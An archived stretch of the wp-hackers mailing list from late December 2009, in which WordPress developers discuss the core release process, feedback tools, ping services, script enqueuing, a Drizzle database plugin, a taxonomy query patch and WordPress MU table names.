Message-ID: <c8f37c930912291244u3990702fl2657fab13721cc92@mail.gmail.com>

On Tue, Dec 29, 2009 at 1:36 AM, Dion Hulse (dd32) <wordpress at dd32.id.au> wrote:
> On Tue, 29 Dec 2009 07:31:46 +1100, Dan Cole <wp at dan-cole.com> wrote:
>>
>> <snip>
>
> Sounds good to me, Here's my long brainstorm of some changes which could be
> useful.
> Please note, That when i say a clear policy, I mainly mean a published
> document somewhere redibly accessable by users that explains it all. I also
> do not intend to attack anyone personally, if something i mention sounds
> like something you may have done, Do not take it as an arguement, Its mainly
> my opinion of how i'd like to see things happen.
>
> I'd like to preface it by saying that WordPress in general seems to be
> staying pretty open about whats happening, although i agree that sometimes
> theres a bit of a "so and so said this was coming in 3.0!" etc sort of item
> before theres even been a meeting to decide.. but sometimse developers will
> get behind something and do it, knowing its in the end users best interests,
> you have to trust them sometimes :) - Make sure you read the Setting Scope
> blog post however before anyone comments on that statement please.
>
>
> I see a few things that WordPress needs:

Agreed on your points.  I'll start by roughly documenting what we
already do, or at least try to do. Let's begin when opening up on a
new release. Here comes the alpha stage:

** Alpha **

* Collect feature ideas from ideas forum, support forums, most popular
plugins, dev brainstorms, and other sources.
* #wordpress-dev meetup to decide on which features we want to commit
to and set the scope of the release
* While this is going on, do some trac gardening of things that got
punted from the previous release. We're pretty bad about this
sometimes, but with 3.0 Peter and I have been going through some of
the backlog.
* With features decided, create "task" tickets for all features
targeted for the release.  Set existing "enhancement" tickets that
made the cut to "task". Start developing and submitting patches to the
tickets.
* At the same time, more trac gardening on existing tickets.
* Continuous integration in trunk, committing feature work early and
often.  Trunk may break at times, but we're all dogfooding the latest
bits.

** Feature Freeze **

* Once all features are deemed complete via meeting on #wordpress-dev,
we enter feature freeze. Sometimes we have features that aren't quite
ready that are noted as exceptions to the freeze.  Everything else is
put in feature freeze with the hope of driving to beta on everything
else.  Ideally, there would be no freeze exceptions.
* Drive to remove all beta "blocker" bugs in prep for entering the beta cycle

** Beta **

* "blocker" tickets are cleared.  Beta 1 is released to kick off the
public beta cycle.
* Fix bugs and start punting enhancements.
* Release Beta 2 about a week later.
* Fix bugs and start punting less severe tickets.
* Release Beta 3 a week later.
* Punt everything but blockers and fix those blockers.

** RC **

* Release RC1
* Wait x days. In the past this has been from 1 day to a week or so.
* If more bugs, release RC2. (We haven't done this in awhile).

** Final Release **

* Release it
* Monitor feedback and start collecting fixes for a maintenance release.

** Alpha **

* Do it all again for the next release.

From m at mullenweg.com  Tue Dec 29 20:53:58 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 29 Dec 2009 12:53:58 -0800
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>	<4B3A62AB.4080809@mullenweg.com>
	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
Message-ID: <4B3A6C66.9010304@mullenweg.com>

On 2009-12-29 12:18 PM, Mike Schinkel wrote:
> Why must you reinvent the wheel when one already exists?

Many reasons, one of which is because I'd like WordPress.org, like 
Wikipedia, to run on a 100% Open Source stack.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Dec 29 20:54:44 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 29 Dec 2009 12:54:44 -0800
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>	<4B3A62AB.4080809@mullenweg.com>	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
	<61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>
Message-ID: <4B3A6C94.2010207@mullenweg.com>

On 2009-12-29 12:36 PM, Mike Schinkel wrote:
> [2]http://thesmallbusinessweb.com/

It's funny that that page promotes Typepad but not WordPress.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From liste at srpski.biz  Tue Dec 29 21:04:24 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Tue, 29 Dec 2009 22:04:24 +0100
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <4B3A6C66.9010304@mullenweg.com>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
	<op.u5ovfbfsspxmuu@dd32>
	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>
	<003401ca88be$84151b60$8c3f5220$@us>
	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>
	<4B3A62AB.4080809@mullenweg.com>
	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
	<4B3A6C66.9010304@mullenweg.com>
Message-ID: <9b6c20460912291304h7a02f6cdsd0010646628b805a@mail.gmail.com>

Then why LiteSpeed?

2009/12/29 Matt Mullenweg <m at mullenweg.com>

> On 2009-12-29 12:18 PM, Mike Schinkel wrote:
>
>> Why must you reinvent the wheel when one already exists?
>>
>
> Many reasons, one of which is because I'd like WordPress.org, like
> Wikipedia, to run on a 100% Open Source stack.
>
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ravi-lists at g8o.net  Tue Dec 29 21:14:35 2009
From: ravi-lists at g8o.net (Ravi Narayan Sarma)
Date: Tue, 29 Dec 2009 16:14:35 -0500
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <4B3A6C94.2010207@mullenweg.com>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>	<4B3A62AB.4080809@mullenweg.com>	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
	<61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>
	<4B3A6C94.2010207@mullenweg.com>
Message-ID: <DC1B4E3D-E95D-42FA-9DF1-CE660CB5D0B3@g8o.net>

On Dec 29, 2009, at 3:54 PM, Matt Mullenweg wrote:
> On 2009-12-29 12:36 PM, Mike Schinkel wrote:
>> [2]http://thesmallbusinessweb.com/
> 
> It's funny that that page promotes Typepad but not WordPress.
> 

And it doesn?t even have a picture of John Gruber on the front page ;-).

Mike, my 2 cents: the other issue I identified (to wit: the lack of movement on the top 5 most desired features), if true, seems a much more important issue than whether we use wordpress.org/ideas or UserVoice (I do agree that UserVoice has a lot of interesting features). IMHO, there are simpler pains (e.g: why can we not change our password?!) to overcome.

OTOH, if major changes are under consideration, I vote GitHub!

	?ravi


From m at mullenweg.com  Tue Dec 29 21:14:51 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 29 Dec 2009 13:14:51 -0800
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <9b6c20460912291304h7a02f6cdsd0010646628b805a@mail.gmail.com>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>	<4B3A62AB.4080809@mullenweg.com>	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>	<4B3A6C66.9010304@mullenweg.com>
	<9b6c20460912291304h7a02f6cdsd0010646628b805a@mail.gmail.com>
Message-ID: <4B3A714B.6060704@mullenweg.com>

On 2009-12-29 1:04 PM, Milan Dini? wrote:
> Then why LiteSpeed?

Legacy, and it's on the roadmap to be replaced.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From liste at srpski.biz  Tue Dec 29 21:16:30 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Tue, 29 Dec 2009 22:16:30 +0100
Subject: [wp-hackers] How to enqueue default scrips in footer?
In-Reply-To: <4ABE76CC.1050504@laptoptips.ca>
References: <9b6c20460909242114t780acfbbv8ce7bd3176f6c7fb@mail.gmail.com>
	<349fe48b0909250345i22e30393m3265266b4e7c4ad5@mail.gmail.com>
	<4f9525dc0909250743y5bd5dd80taa0be29a5333ce44@mail.gmail.com>
	<161617690909251003p6c84c61s12d600a14988fa42@mail.gmail.com>
	<9b6c20460909251405h1296a04aiec1ea2da6ac90d6d@mail.gmail.com>
	<4ABE76CC.1050504@laptoptips.ca>
Message-ID: <9b6c20460912291316m78292c62ma6726dcc3b5f627a@mail.gmail.com>

I never got this to work. Maybe I don't do actions as I should.
Is there any working example of this? I searched with code example from here
and didn't find anything.


2009/9/26 Andrew Ozz <admin at laptoptips.ca>

> Milan Dini? wrote:
>
>> Thank you for your answers. Tynan's approach still places it in header
>> while
>> Otto's make error (Call to a member function add_data() on a non-object in
>> ...).
>>
>
> There are actions to specifically enqueue scripts and stylesheets:
>
> http://core.trac.wordpress.org/browser/trunk/wp-includes/script-loader.php#L684
> http://core.trac.wordpress.org/browser/trunk/wp-admin/admin-header.php#L54
>
> If you really need to change the location of a default script by hand you
> could use:
>
> $wp_scripts->add_data('handle', 'group', 1 );
>
> as Otto suggested, where 1 = footer, 0 = head. This has to run after the
> scripts are added/registered but before any scripts are printed, best done
> from the above actions with priority of 11 or more.
>
> However note that scripts are moved from the footer to the head if a
> dependent script is enqueued there, forcing the default script back to the
> footer would break the dependency.
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From liste at srpski.biz  Tue Dec 29 21:21:17 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Tue, 29 Dec 2009 22:21:17 +0100
Subject: [wp-hackers] Ping pages
In-Reply-To: <4B3A620D.9000608@mullenweg.com>
References: <56692.8725.29646-7636-43416360-1262089169@post.cz>
	<OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>
	<e4dc67e0912291016u48da8c12ya72f4bd4d3d65e28@mail.gmail.com>
	<161617690912291158o3366b613x6aa2469301a342f@mail.gmail.com>
	<4B3A620D.9000608@mullenweg.com>
Message-ID: <9b6c20460912291321r79a8c8efh8e93aef7960b4df8@mail.gmail.com>

>
> where all major search engines listen to the Pingomatic feed.
>

In list on pingomatic.com I see only Google from major search engines
(though there is My Yahoo!). Do you have any more information which search
engines (from top 3) listen Pingomatic and in what way?

2009/12/29 Matt Mullenweg <m at mullenweg.com>

> On 2009-12-29 11:58 AM, Otto wrote:
>
>> If you want sub-minute times for Google indexing, your best bet is to
>> use PubSubHubbub. You can get this automatically if you use
>> FeedBurner, or you can run your own.
>>
>
> I have seen no information even suggesting that PSHB is hooked up to search
> results, where all major search engines listen to the Pingomatic feed.
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From julioprotzek at gmail.com  Tue Dec 29 21:26:34 2009
From: julioprotzek at gmail.com (Julio Protzek)
Date: Tue, 29 Dec 2009 19:26:34 -0200
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <DC1B4E3D-E95D-42FA-9DF1-CE660CB5D0B3@g8o.net>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com> 
	<op.u5ovfbfsspxmuu@dd32>
	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net> 
	<003401ca88be$84151b60$8c3f5220$@us>
	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net> 
	<4B3A62AB.4080809@mullenweg.com>
	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net> 
	<61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>
	<4B3A6C94.2010207@mullenweg.com> 
	<DC1B4E3D-E95D-42FA-9DF1-CE660CB5D0B3@g8o.net>
Message-ID: <77ee26030912291326x6606cc95x89405b9d2575fb57@mail.gmail.com>

2009/12/29 Ravi Narayan Sarma <ravi-lists at g8o.net>
>
> OTOH, if major changes are under consideration, I vote GitHub!
>
>
GitHub would be really good. Some integration to between GitHub and plugins
page would be health too.

From mikeschinkel at newclarity.net  Tue Dec 29 21:36:15 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 29 Dec 2009 16:36:15 -0500
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <4B3A6C94.2010207@mullenweg.com>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>	<4B3A62AB.4080809@mullenweg.com>	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
	<61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>
	<4B3A6C94.2010207@mullenweg.com>
Message-ID: <4801DE79-28B1-49DD-8929-BC109E6BBE60@newclarity.net>

Matt Mullenweg wrote:
>> [2]http://thesmallbusinessweb.com/
> 
> It's funny that that page promotes Typepad but not WordPress.


Actually, if you read it you'll find they are not "promoting" TypePad per se; instead TypePad took action and signed their manifesto which I am strongly in favor of: 

From: http://thesmallbusinessweb.com/manifesto.html

We invite companies that serve the small business market to show their support for the Small Business Web by signing our Manifesto. Must have a passion for customer service, an excellent product or service, a solid business model and an API.

You could sign their manifesto on behalf of WordPress.com if you like and then I'm sure they'd be happy to "promote" Wordpress too. I would think you believe Wordpress fits those criteria?

Matt Mullenweg wrote:
>> Why must you reinvent the wheel when one already exists?
> 
> Many reasons, one of which is because I'd like WordPress.org, like Wikipedia, to run on a 100% Open Source stack.

Sorry for being snarky but it wouldn't be Wordpress.org, it would be http://wordpress.uservoice.org. :)

Anyway, it would really be nice to see you use it until a better open-source alternative emerges instead of being hobbled in the mean time.  (OTOH, as the top requests go unanswered so maybe having a better ideas forum isn't really the answer?)

Ravi Narayan Sarma wrote:
> Mike, my 2 cents: the other issue I identified (to wit: the lack of movement on the top 5 most desired features), if true, seems a much more important issue than whether we use wordpress.org/ideas or UserVoice (I do agree that UserVoice has a lot of interesting features). IMHO, there are simpler pains (e.g: why can we not change our password?!) to overcome.

Excellent point.

-Mike Schinkel


From otto at ottodestruct.com  Tue Dec 29 21:40:22 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 29 Dec 2009 15:40:22 -0600
Subject: [wp-hackers] Ping pages
In-Reply-To: <4B3A620D.9000608@mullenweg.com>
References: <56692.8725.29646-7636-43416360-1262089169@post.cz> 
	<OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>
	<e4dc67e0912291016u48da8c12ya72f4bd4d3d65e28@mail.gmail.com> 
	<161617690912291158o3366b613x6aa2469301a342f@mail.gmail.com> 
	<4B3A620D.9000608@mullenweg.com>
Message-ID: <161617690912291340x255c242fhd22beaf32c9f48c7@mail.gmail.com>

On Tue, Dec 29, 2009 at 2:09 PM, Matt Mullenweg <m at mullenweg.com> wrote:
> On 2009-12-29 11:58 AM, Otto wrote:
>>
>> If you want sub-minute times for Google indexing, your best bet is to
>> use PubSubHubbub. You can get this automatically if you use
>> FeedBurner, or you can run your own.
>
> I have seen no information even suggesting that PSHB is hooked up to search
> results, where all major search engines listen to the Pingomatic feed.

And yet I've seen under a minute times on blogs showing up in Google
after I hooked them up with FeedBurner, without pinging any RPC
servers.

I'm just speaking from what I've seen, but it does appear to me that
Google is using PSHB for the main search engine crawler.

-Otto

From william.canino at googlemail.com  Tue Dec 29 23:01:34 2009
From: william.canino at googlemail.com (William Canino)
Date: Tue, 29 Dec 2009 18:01:34 -0500
Subject: [wp-hackers] compression and caching
In-Reply-To: <3A34311F3401425B800D29E87A569520@Asuh>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
	<e4dc67e0912291034k7804d943oc6bef5b6f4b17af4@mail.gmail.com>
	<59e7f3130912291044r1a728ec9lca52c48b1b5b4c51@mail.gmail.com>
	<8606CC44-E097-4580-BF02-676CB5974B55@newclarity.net>
	<3A34311F3401425B800D29E87A569520@Asuh>
Message-ID: <e4dc67e0912291501u4112a772p7d9e39228bd2cfc4@mail.gmail.com>

> My biggest cause here was to be forward thinking, to promote optimization to
> the core so that everyone benefits. ...
> is settled, I don't think my contributing to it will help this cause
> anymore. However, I really hope this talk doesn't die simply as plugin
> dismissed. Thanks for listening.

Micah, I second what Mike said:

> Instead what is needed is to look at the problem and determine if there are fundamental
> aspects of the need that can and should be put into core so that other plugins can build
> upon them.

One example of this is comment metadata.  Before 2.9, dozens of
plugins, for things like  antispam, social networking, etc., coded
their own thing to provide extra fields to comments.  The overlap is
mind-blowing.  In 2.9, we move forward a bit. I think you can still
contribute by identifying the fundamental services that all C&C
plugins use.  Crusading those has bigger benefit.

W


2009/12/29 Micah <wp at twolanedesign.com>:
> Yikes, I never meant to PO anyone by bringing up this discussion. I only
> started this talk out of my concern for Wordpress and while I am totally
> willing to accept certain things shouldn't be and it should never be up to
> one person for a community to make a change. I believe in community support
> and I clearly hear the opposition so I will not add to this debate as I know
> Jacob and Otto are sick of me already.
>
> My biggest cause here was to be forward thinking, to promote optimization to
> the core so that everyone benefits. I appreciate the feedback and apologize
> if I came across as an ignorant brick wall. While I don't agree this debate
> is settled, I don't think my contributing to it will help this cause
> anymore. However, I really hope this talk doesn't die simply as plugin
> dismissed. Thanks for listening.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Tue Dec 29 23:27:13 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 29 Dec 2009 18:27:13 -0500
Subject: [wp-hackers] compression and caching
In-Reply-To: <e4dc67e0912291501u4112a772p7d9e39228bd2cfc4@mail.gmail.com>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
	<e4dc67e0912291034k7804d943oc6bef5b6f4b17af4@mail.gmail.com>
	<59e7f3130912291044r1a728ec9lca52c48b1b5b4c51@mail.gmail.com>
	<8606CC44-E097-4580-BF02-676CB5974B55@newclarity.net>
	<3A34311F3401425B800D29E87A569520@Asuh>
	<e4dc67e0912291501u4112a772p7d9e39228bd2cfc4@mail.gmail.com>
Message-ID: <0A3BAC2F-D6E8-4A87-9B71-77EAD996B52F@newclarity.net>

On Dec 29, 2009, at 6:01 PM, William Canino wrote:
>> Instead what is needed is to look at the problem and determine if there are fundamental
>> aspects of the need that can and should be put into core so that other plugins can build
>> upon them.
> 
> One example of this is comment metadata.  Before 2.9, dozens of
> plugins, for things like  antispam, social networking, etc., coded
> their own thing to provide extra fields to comments.  The overlap is
> mind-blowing.  In 2.9, we move forward a bit. I think you can still
> contribute by identifying the fundamental services that all C&C
> plugins use.  Crusading those has bigger benefit.

Two thumbs up on that example!  Thanks W.

-Mike

From ravi-lists at g8o.net  Wed Dec 30 00:28:14 2009
From: ravi-lists at g8o.net (// ravi)
Date: Tue, 29 Dec 2009 19:28:14 -0500
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <4801DE79-28B1-49DD-8929-BC109E6BBE60@newclarity.net>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>	<4B3A62AB.4080809@mullenweg.com>	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
	<61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>
	<4B3A6C94.2010207@mullenweg.com>
	<4801DE79-28B1-49DD-8929-BC109E6BBE60@newclarity.net>
Message-ID: <24640A85-E85D-4C97-B571-8EAE589CA13C@g8o.net>

On Dec 29, 2009, at 4:36 PM, Mike Schinkel wrote:
> Ravi Narayan Sarma wrote:
>> Mike, my 2 cents: the other issue I identified (to wit: the lack of movement on the top 5 most desired features), if true, seems a much more important issue than whether we usewordpress.org/ideas or UserVoice (I do agree that UserVoice has a lot of interesting features). IMHO, there are simpler pains (e.g: why can we not change our password?!) to overcome.
> 

Correction in the above. It should be ?other issue you identified? (not ?I?).

	?ravi



From shane at bugssite.org  Wed Dec 30 05:09:22 2009
From: shane at bugssite.org (Shane A. Froebel)
Date: Wed, 30 Dec 2009 00:09:22 -0500
Subject: [wp-hackers] Seasons Greeting!
In-Reply-To: <61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
	<op.u5ovfbfsspxmuu@dd32>
	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>
	<003401ca88be$84151b60$8c3f5220$@us>
	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>
	<4B3A62AB.4080809@mullenweg.com>
	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
	<61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>
Message-ID: <4B3AE082.2000405@bugssite.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hey all.. just to wish you all a seasons greeting!

Your Friend, Shane
http://bugssite.org/
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (MingW32)

iQIcBAEBAgAGBQJLOuCCAAoJEC7/vS6gbNwFF9gQAKify2QBg2ooktq8w0FACJsL
H1grnUjvKMBzKi9ZirFwtubHT0Z3Mdvz4GUhLSJ2jgxRr/ZVe5AkNKC2/G6aOBfO
EPUy6+/ZQsCHJvMy9lr6hRJvAR+NPIn5kpbSxvayQM8lo5ZDl2Osmj/cvGJk8OwM
cAYhEY6fhXzR+ah0HiIbzmvExZxcAlRRBE6eZGc+VuuCcsx/OR4Qmd7deAYBe5Y9
L3mC/DyBxcO48bjrlYfwRHEiB6474u15orTwEZvfzWqtLtIJOWEOUp7c+FibiNxV
J3B/ZEedISM3TCm18qyeq0h+RzqKWevpB/JnTruwB+NHS62ym+QVgxq/gJL+yG4d
D60FtuFb2JAq3x5sZGpwJ8dNGMidrejBy6aSFAIHV3dwplSUaG+Qttp647OKyJkY
co+h3Ho/PusEsfEK9EskfDitRK9VMVLtZm8nM47cWZVB4+Ub3wrZmH7zLsrKTlpd
U55CNjNpDZ662xWwxn0hxUKDsu/P7+YA4xqBc2t/Q0i8uCmMM5jOV7Vi2cuBqCyI
zYy3brMlSBDC6Fi8lKKkAPkp/p8g0rhGWsksuMO02QlUL04k8GkdeHnkYMZeNa2x
67QdHIy0ig8/YVtnxcd8KyTOzhKXNwi5/kg2zQVicm5s83a8N+JnSLkU/agbs1do
Rl7rmu/ku1EkHFjskUWr
=FubQ
-----END PGP SIGNATURE-----

From jdub at bethesignal.org  Wed Dec 30 14:45:51 2009
From: jdub at bethesignal.org (Jeff Waugh)
Date: Thu, 31 Dec 2009 01:45:51 +1100
Subject: [wp-hackers] WordPress and Drizzle
Message-ID: <20091230144550.GA20426@node.waugh.id.au>

Hi all,

Just a quick note to say that you can now play with WordPress and Drizzle
without experiencing that nasty, nasty bug [1] which managed to crash the
server on almost every page view!

Check out the Drizzle database adapter here:

  http://wordpress.org/extend/plugins/drizzle/

That's right -- an early WordPress port making tomorrow better, today! ;-)

(No one, least of all the Drizzle developers or I, would recommend using
this on a production blog. It will spare your dog, but may just kill your
cat.)

Thanks,

- Jeff

[1] https://bugs.launchpad.net/drizzle/+bug/388889 (my early bug report)
    https://bugs.launchpad.net/drizzle/+bug/500031 (reproduced and fixed!)

-- 
The Great Australian Internet Blackout   http://www.internetblackout.com.au/
 
     "Beware the lollypop of mediocrity: Lick it once, and you'll suck
                          forever." - Brian Wilson

From tom at motionmill.com  Wed Dec 30 15:45:21 2009
From: tom at motionmill.com (tom at motionmill.com)
Date: 30 Dec 2009 16:45:21 +0100
Subject: [wp-hackers] =?utf-8?q?WordPress_and_Drizzle?=
Message-ID: <20091230154521.17900.qmail@s1.addwittz.com>

Hello,

I'm  out of the office. For urgent matters, please call our office or contact one of my colleagues. You find their contact data on the motionmill website. I'll be back on January the 4th.

http://motionmill.com/

Have a nice day,

Tom



From harish.mlists at gmail.com  Wed Dec 30 16:11:36 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Wed, 30 Dec 2009 16:11:36 +0000
Subject: [wp-hackers] WordPress and Drizzle
In-Reply-To: <20091230144550.GA20426@node.waugh.id.au>
References: <20091230144550.GA20426@node.waugh.id.au>
Message-ID: <4B3B7BB8.4040302@gmail.com>

On 30/12/2009 14:45, Jeff Waugh wrote:
> Hi all,
> 
> Just a quick note to say that you can now play with WordPress and Drizzle
> without experiencing that nasty, nasty bug [1] which managed to crash the
> server on almost every page view!
> 
> Check out the Drizzle database adapter here:
> 
>   http://wordpress.org/extend/plugins/drizzle/
> 
> That's right -- an early WordPress port making tomorrow better, today! ;-)
> 
> (No one, least of all the Drizzle developers or I, would recommend using
> this on a production blog. It will spare your dog, but may just kill your
> cat.)

It is not clear to me after going through the launchpad page for
Drizzle, so could you clarify the obvious advantages of using Drizzle
instead of MySQL (today, or perhaps in the future)?

Thanks!
Harish

From joehoyle at gmail.com  Wed Dec 30 16:53:42 2009
From: joehoyle at gmail.com (Joe Hoyle)
Date: Wed, 30 Dec 2009 16:53:42 +0000
Subject: [wp-hackers] Limitations and Patch for WP_Query Taxonomy Stuff
Message-ID: <394F4785-02BB-4D48-830A-266DE6A0D22B@gmail.com>

Hi Everyone,

I wanted to discuss some a limitation I have come across several times when querying: querying for posts by multiple taxonomies. Currently you can do things like category__in, category__not_in etc which is good, if you only want to query tags or categories. However, if you have a few extra taxonomies set up, you are restricted by query for one term in a single custom taxonomy. I created a patch here: http://core.trac.wordpress.org/ticket/9951 which adds support for $tax__in, $tax__not_in (this patch needs some work, it is really a proof of concept).

After mulling over that for a while, it got me thinking. Whats the point in even having category__in, and tag__in duplicated in the query class (not to mention category__not_in, category__and, category__slug_in or whatever etc etc...). Why not have this querying by taxonomy (be it categories, tags, manufacturers, companies etc etc) all dealt with by the same code. The only issue then is the annoying difference between tag__in, and the taxonomy name which is post_tag. We have an array of registered taxonomies (post_tag, category, manufacturers) simply check the query vars for an registered taxonomies: *__in, *__not_in, *__slug_in, *__and blah blah blah. This we I can query by any amount of terms in any amount of taxonomies be they custom or "normal".

I have also written an experimental patch: http://core.trac.wordpress.org/attachment/ticket/9951/tax-experimental.diff which gets rid of all the category__not_in, tag__not_in stuff and replaces with checks off of all registered taxonomies. Again, this needs some work; for example hardcoding the 'tag__' to 'post_tag__' etc, but I wanted to get a proof of concept out to see how it could be done. 

Personally, I think the more WordPress is used for more complex data / custom post types the more custom taxonomies will be used, and not having the ability to query for any amount is going to be limiting. I just wondered if anyone else thinks this is something worth pushing for in core, or anyone fancies writing in improved patch etc.

Cheers

Joe

From tim at silentgap.com  Wed Dec 30 17:23:06 2009
From: tim at silentgap.com (Tim Schoffelman)
Date: Wed, 30 Dec 2009 11:23:06 -0600
Subject: [wp-hackers]  WordPress MU category tables
Message-ID: <5b1aecc0912300923y299a90a8v225e7eb9097ecdda@mail.gmail.com>

Another question question (hopefully).

I'm building a plugin that will grab all the tables used in a WordPress MU
blog (note: I don't need all the tables, just the ones specific for that
blog the plugin is active on). The wpdb object contains the array

Install 2.7.1

    [blog_tables] => Array
        (
            [0] => posts
            [1] => categories
            [2] => post2cat
            [3] => comments
            [4] => links
            [5] => link2cat
            [6] => options
            [7] => postmeta
            [8] => terms
            [9] => term_taxonomy
            [10] => term_relationships
        )

Install 2.8.4a

    [tables] => Array
        (
            [0] => posts
            [1] => categories
            [2] => post2cat
            [3] => comments
            [4] => links
            [5] => link2cat
            [6] => options
            [7] => postmeta
            [8] => terms
            [9] => term_taxonomy
            [10] => term_relationships
        )


but in WordPress MU, the categories, post2cat & link2cat tables aren't used
(not on my installs anyways 2.7.1 && 2.8.4a). IE - there's no
wp_4_categories or wp_categories table.

I'm having to rely on something like this to pull the correct tables (but
feel as I shouldn't have too).

class BlogTables {
	function selectNames() {
		global $table_prefix, $wpdb;

		$sql		= "SHOW TABLES LIKE '".$prefix."%'";
		$avail_tables 	= $wpdb->get_results($sql);

		foreach ($avail_tables as $tables) {
			foreach($tables as $key => $table){
				$blog_tables[] = $table;
			}
		}
		return $blog_tables;
	}
}


